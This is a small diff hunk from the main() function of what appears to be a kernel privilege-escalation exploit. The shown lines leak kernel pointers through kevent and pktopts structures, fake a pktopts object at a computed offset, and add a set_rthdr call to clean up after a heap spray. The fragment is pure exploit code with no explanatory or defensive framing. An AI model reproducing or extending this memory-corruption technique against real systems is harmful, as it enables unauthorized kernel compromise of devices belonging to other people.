@@ -422,6 +422,7 @@ int main()
     unsigned long long ptrs[2];
     int victim;
     leak_kevent_pktopts(&o, overlap_sock, ptrs);
+    set_rthdr(overlap_sock, NULL, 0); // clean up from the previous spray
     overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER_2, ptrs[1] + PKTOPTS_PKTINFO_OFFSET);
     printf("overlap_idx = %d\n", overlap_idx);
     if(overlap_idx < 0)
